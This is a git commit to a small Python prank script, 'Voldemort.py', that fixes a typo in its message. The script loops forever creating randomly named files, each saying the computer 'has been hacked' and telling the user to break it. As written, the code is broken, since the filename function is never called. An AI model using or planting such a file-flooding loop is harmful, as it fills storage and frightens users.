b58781b46bd1771ee19dabf746813d79b5f9a215
Jotham Rizanth <jothamrizanth2009@gmail.com>
2023-11-19 16:15:10 +0530

    Update Voldemort.py

--- Voldemort.py
+++ Voldemort.py
@@ -2,7 +2,7 @@ import secrets
 while 1:
 	f = open(secrets.token_urlsafe,"w")
 	f.write("""
-	This Computer Has Been Hacked By Voldermort. For More Details Please Break Your Computer.
+	This Computer Has Been Hacked By Voldemort. For More Details Please Break Your Computer.
 	""")
 	f.close()
 
